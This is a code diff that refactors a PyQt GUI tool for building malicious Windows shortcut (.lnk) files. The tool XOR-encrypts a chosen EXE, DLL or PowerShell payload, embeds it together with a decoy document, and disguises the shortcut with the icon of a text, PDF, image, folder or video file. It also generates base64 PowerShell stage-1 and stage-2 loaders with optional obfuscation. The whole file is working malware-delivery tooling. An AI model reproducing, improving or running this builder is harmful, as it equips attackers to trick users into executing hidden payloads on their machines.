@@ -435,25 +435,26 @@ class MainWindow(QWidget):
     def update_icon(self):
         icon_size = 75
 
-        if self.doc_button.isChecked():
-            pixmap = QPixmap('img/doc.ico')
-        elif self.txt_button.isChecked():
-            pixmap = QPixmap('img/txt.png')
-        elif self.jpg_button.isChecked():
-            pixmap = QPixmap('img/jpg.ico')
-        elif self.zip_button.isChecked():
-            pixmap = QPixmap('img/zip.ico')
-        elif self.folder_button.isChecked():
-            pixmap = QPixmap('img/folder.ico')
-        elif self.mp3_button.isChecked():
-            pixmap = QPixmap('img/mp3.ico')
-        elif self.pdf_button.isChecked():
-            pixmap = QPixmap('img/pdf.ico')
-        elif self.video_button.isChecked():
-            pixmap = QPixmap('img/video.png')
+        icons = {
+            self.doc_button: 'img/doc.ico',
+            self.txt_button: 'img/txt.png',
+            self.jpg_button: 'img/jpg.ico',
+            self.zip_button: 'img/zip.ico',
+            self.folder_button: 'img/folder.ico',
+            self.mp3_button: 'img/mp3.ico',
+            self.pdf_button: 'img/pdf.ico',
+            self.video_button: 'img/video.png'
+        }
 
-        pixmap = pixmap.scaled(icon_size, icon_size)
-        self.icon_display_label.setPixmap(pixmap)
+        pixmap = None
+        for button, path in icons.items():
+            if button.isChecked():
+                pixmap = QPixmap(path)
+                break
+
+        if pixmap:
+            pixmap = pixmap.scaled(icon_size, icon_size)
+            self.icon_display_label.setPixmap(pixmap)
 
     def handle_payload_type_change(self, index):
         payload_type = self.payload_type_input.currentText()
@@ -482,7 +483,6 @@ class MainWindow(QWidget):
             if file_path:
                 self.psobfuscator_file_input.setText(file_path)
 
-
     def generate_payload(self):
         global loader_template
         global stage1_command_template
@@ -493,92 +493,104 @@ class MainWindow(QWidget):
         global filetype
         global hrlnkfilesize
         global lnkfilename
+
         payload_type = self.payload_type_input.currentText()
         payload_file_input = self.payload_file_input.text()
         decoy_file_input = self.decoy_file_input.text()
+
         if not payload_file_input:
             self.console.append("[*] No Payload File Specified!")
             return
         if not os.path.isfile(payload_file_input):
             self.console.append("[*] Specified Payload File does not exist!")
             return
-        if payload_type == "Executable":
-            if not payload_file_input.lower().endswith(".exe"):
-                self.console.append("[*] Input error! Payload type is: Executable")
+
+        extensions = {
+            "Executable": ".exe",
+            "Dynamic-link library": ".dll",
+            "PowerShell Script": ".ps1"
+        }
+
+        if payload_type in extensions:
+            ext = extensions[payload_type]
+            if not payload_file_input.lower().endswith(ext):
+                self.console.append(f"[*] Input error! Payload type is: {payload_type}")
                 return
-        if payload_type == "Dynamic-link library":
-            if not payload_file_input.lower().endswith(".dll"):
-                self.console.append("[*] Input error! Payload type is: Dynamic-link library")
-                return
-        if payload_type == "PowerShell Script":
-            if not payload_file_input.lower().endswith(".ps1"):
-                self.console.append("[*] Input error! Payload type is: PowerShell Script")
-                return
+
         if not decoy_file_input:
             self.console.append("[*] No Decoy File Specified!")
             return
         if not os.path.isfile(decoy_file_input):
             self.console.append("[*] Specified Decoy File does not exist!")
             return
+
         dll_ep = self.dll_entrypoint_input.text()
         decoyname = os.path.basename(decoy_file_input)
         decoysize = os.path.getsize(decoy_file_input)
-        payloadname = os.path.basename(payload_file_input)        
+        payloadname = os.path.basename(payload_file_input)
         payloadsize = os.path.getsize(payload_file_input)
         payload_start_byte = 0x00003000 + decoysize + 1
         loader_start_byte = 0x00003000 + decoysize + 1 + payloadsize + 1
         xor_key = ''.join(random.choices(string.ascii_letters + string.digits, k=15))
         loader_template = loader_template.replace('#replacemexorkey', xor_key)
         obfuscator_path = self.psobfuscator_file_input.text().strip()
-        
-        if self.txt_button.isChecked():
-            icon = 'C:\\Windows\\System32\\notepad.exe'
-            icon_index = 0
-            filetype = 'Text Document'
-        elif self.jpg_button.isChecked():
-            icon = 'C:\\Windows\\System32\\imageres.dll'
-            icon_index = 67
-            filetype = 'JPG File'
-        elif self.folder_button.isChecked():
-            icon = 'C:\\Windows\\System32\\SHELL32.dll'
-            icon_index = 4
-            filetype = 'Folder'
-        elif self.zip_button.isChecked():
-            icon = 'C:\\Windows\\System32\\imageres.dll'
-            icon_index = 165
-            filetype = 'Compressed (zipped) Folder'
-        elif self.mp3_button.isChecked():
-            icon = 'C:\\Windows\\System32\\imageres.dll'
-            icon_index = 125
-            filetype = 'MP3'
-        elif self.doc_button.isChecked():
-            icon = 'C:\\Windows\\System32\\SHELL32.dll'
-            icon_index = 1
-            filetype = 'Document'
-        elif self.pdf_button.isChecked():
-            icon = '%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe'
-            icon_index = 11
-            filetype = 'PDF'
-        elif self.video_button.isChecked():
-            icon = 'C:\\Windows\\System32\\SHELL32.dll'
-            icon_index = 118
-            filetype = 'Video'
-        
-        if payload_type == "PowerShell Script":
+
+        icons = {
+            self.txt_button:       ('C:\\Windows\\System32\\notepad.exe', 0, 'Text Document'),
+            self.jpg_button:       ('C:\\Windows\\System32\\imageres.dll', 67, 'JPG File'),
+            self.folder_button:    ('C:\\Windows\\System32\\SHELL32.dll', 4, 'Folder'),
+            self.zip_button:       ('C:\\Windows\\System32\\imageres.dll', 165, 'Compressed (zipped) Folder'),
+            self.mp3_button:       ('C:\\Windows\\System32\\imageres.dll', 125, 'MP3'),
+            self.doc_button:       ('C:\\Windows\\System32\\SHELL32.dll', 1, 'Document'),
+            self.pdf_button:       ('%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe', 11, 'PDF'),
+            self.video_button:     ('C:\\Windows\\System32\\SHELL32.dll', 118, 'Video'),
+        }
+
+        icon = None
+        icon_index = None
+        filetype = None
+
+        for button, (icon_path, idx, ftype) in icons.items():
+            if button.isChecked():
+                icon = icon_path
+                icon_index = idx
+                filetype = ftype
+                break
+
+        if icon is None:
+            self.console.append("[*] No icon type selected!")
+            return
+
+        def ps():
+            nonlocal loader_start_byte
             loader_start_byte = 0x00003000 + decoysize + 1
-        elif payload_type == "Dynamic-link library":
+
+        def dll():
+            global loader_template
             loader_template = loader_template.replace('#replacemesavedfile', f'$payload_file = "$env:localappdata\\{payloadname}";')
             loader_template = loader_template.replace('#replacemepayloadexec', dllexec)
             loader_template = loader_template.replace('#replacemedllep', f'$dll_entrypoint = "{dll_ep}"')
-        elif payload_type == "Executable":
+
+        def exe():
+            global loader_template
             loader_template = loader_template.replace('#replacemesavedfile', f'$payload_file = "$env:localappdata\\{payloadname}";')
             loader_template = loader_template.replace('#replacemepayloadexec', exeexec)
-        
+
+        payload_types = {
+            "PowerShell Script": ps,
+            "Dynamic-link library": dll,
+            "Executable": exe,
+        }
+
+        if payload_type in payload_types:
+            payload_types[payload_type]()
+
         try:
             QApplication.processEvents()
             self.console.append("[*] Reading payload file...")
             with open(payload_file_input, 'rb') as file:
                 content = file.read()
+
             if payload_type != "PowerShell Script":
                 self.console.append("[*] Encrypting payload File")
                 payloadfile_enc = xor_encrypt_payload_decoy(content, xor_key)
@@ -586,9 +598,11 @@ class MainWindow(QWidget):
                 with open('payload_enc', 'wb') as file:
                     file.write(payloadfile_enc)
                 self.console.append(f"[*] Success! Encrypted Payload size: {payloadbyte_count} bytes")
+
             if payload_type == "PowerShell Script":
                 ps1_content = content.decode('utf-8').strip()
                 loader_template = loader_template.replace('#replacemepayloadexec', ps1_content)
+
             self.console.append("[*] Reading decoy file...")
             with open(decoy_file_input, 'rb') as file:
                 content = file.read()
@@ -601,12 +615,15 @@ class MainWindow(QWidget):
             self.console.append("[*] Generating Stage 2 Loader")
             loader_template = loader_template.replace('#replacemedecoyname', str(decoyname))
             loader_template = loader_template.replace('#replacemedecoylength', str(decoybyte_count))
+
             if payload_type != "PowerShell Script":
                 loader_template = loader_template.replace('#replacemepayloadstartbyte', f'0x{payload_start_byte:08x}')
                 loader_template = loader_template.replace('#replacemepayloadlength', str(payloadbyte_count))
+
             loader_path = os.path.join(tempfile.gettempdir(), "loader")
             with open(loader_path, 'w', encoding="utf-8") as loader_file:
                 loader_file.write(loader_template)
+
             if obfuscator_path:
                 self.console.append("[*] Obfuscating Stage 2...")
                 try:
@@ -617,14 +634,19 @@ class MainWindow(QWidget):
                     return
             else:
                 stage2_processed = loader_template
+
             loader_utf8_content = stage2_processed.encode('utf-8')
             loaderbase64_encoded = base64.b64encode(loader_utf8_content)
+
             with open('loader_enc', 'wb') as output_file:
                 output_file.write(loaderbase64_encoded)
+
             script_length = len(loaderbase64_encoded)
             lnkfilesize = 0x00003000 + decoysize + 1 + payloadsize + 1 + script_length
+
             if payload_type == "PowerShell Script":
                 lnkfilesize = 0x00003000 + decoysize + 1 + script_length
+
             totallnkfilesize = int(lnkfilesize)
             units = ["B", "KB", "MB", "GB"]
             index = 0
@@ -632,14 +654,18 @@ class MainWindow(QWidget):
                 lnkfilesize /= 1024.0
                 index += 1
             hrlnkfilesize = f"{lnkfilesize:.2f} {units[index]}"
+
             self.console.append(f"[*] Success! Stage 2 Loader saved! Size: {script_length} bytes")
             self.console.append("[*] Generating Stage 1")
-            stage1_command_template = stage1_command_template.replace('#replacemescriptlength', str(script_length))
-            stage1_command_template = stage1_command_template.replace('#replacemetotallnkfilesize', str(totallnkfilesize))
-            stage1_command_template = stage1_command_template.replace('#replacemeloaderstartbyte', f'0x{loader_start_byte:08x}')
+
+            stage1_command_template_local = stage1_command_template.replace('#replacemescriptlength', str(script_length))
+            stage1_command_template_local = stage1_command_template_local.replace('#replacemetotallnkfilesize', str(totallnkfilesize))
+            stage1_command_template_local = stage1_command_template_local.replace('#replacemeloaderstartbyte', f'0x{loader_start_byte:08x}')
+
             stage1_path = os.path.join(tempfile.gettempdir(), "stage1")
             with open(stage1_path, 'w', encoding="utf-8") as stage1_file:
-                stage1_file.write(stage1_command_template)
+                stage1_file.write(stage1_command_template_local)
+
             if obfuscator_path:
                 self.console.append("[*] Obfuscating stage 1...")
                 try:
@@ -649,19 +675,23 @@ class MainWindow(QWidget):
                     self.console.append(f"[-] Obfuscation error: {e}")
                     return
             else:
-                stage1_processed = stage1_command_template
+                stage1_processed = stage1_command_template_local
+
             stage1_utf16le_content = stage1_processed.encode('utf-16le')
             stage1base64_encoded = base64.b64encode(stage1_utf16le_content)
             stringstage1encoded = stage1base64_encoded.decode('utf-8')
+
             self.console.append("[*] Success! Stage 1 Generated!")
             create_lnk(stringstage1encoded)
             self.console.append("[*] Lnk File Generated !")
+
             decoysource = 'decoy_enc'
             decoyseek = 0x3000
             self.console.append("[*] Embedding decoy file")
             append_file(decoysource, decoyseek)
             self.console.append(f"[*] Decoy start byte is: 0x{decoyseek:08x}")
             self.console.append(f"[*] Decoy end byte is: 0x{payload_start_byte - 1:08x}")
+
             if payload_type != "PowerShell Script":
                 payloadsource = 'payload_enc'
                 payloadseek = hex(payload_start_byte)
@@ -669,20 +699,40 @@ class MainWindow(QWidget):
                 append_file(payloadsource, int(payloadseek, 16))
                 self.console.append(f"[*] Payload start byte is: 0x{payload_start_byte:08x}")
                 self.console.append(f"[*] Payload end byte is: 0x{loader_start_byte - 1:08x}")
+
             loadersource = 'loader_enc'
             loaderseek = hex(loader_start_byte)
             append_file(loadersource, int(loaderseek, 16))
             self.console.append(f"[*] Loader start byte is: 0x{loader_start_byte:08x}")
             self.console.append(f"[*] Loader end byte is: 0x{loader_start_byte + script_length:08x}")
+
             with open(lnkfilename, 'rb') as file:
                 lnkfilecontent = file.read()
-            subprocess.run(['rm', lnkfilename])
+
+
+            try:
+                os.remove(lnkfilename)
+            except FileNotFoundError:
+                pass
+
             self.console.append("[*] Cleaning Up...")
-            subprocess.run(['rm', 'decoy_enc'])
+            try:
+                os.remove('decoy_enc')
+            except FileNotFoundError:
+                pass
             if payload_type != "PowerShell Script":
-                subprocess.run(['rm', 'payload_enc'])
-            subprocess.run(['rm', 'loader_enc'])
+                try:
+                    os.remove('payload_enc')
+                except FileNotFoundError:
+                    pass
+            try:
+                os.remove('loader_enc')
+            except FileNotFoundError:
+                pass
+
+
             output_file, _ = QFileDialog.getSaveFileName(self, "Save Output File", 'example.lnk', "lnk Files (*.lnk)")
+
             if output_file:
                 with open(output_file, 'wb') as saved_file:
                     saved_file.write(lnkfilecontent)
@@ -690,9 +740,10 @@ class MainWindow(QWidget):
                 QMessageBox.about(self, "Success!", "Success! Lnk file generated and saved!")
             else:
                 self.console.append("[*] Lnk File saving canceled!")
-        
+
         except ValueError as e:
             self.console.append(f"Error: {e}")
+
 
 if __name__ == '__main__':
     app = QApplication(sys.argv)
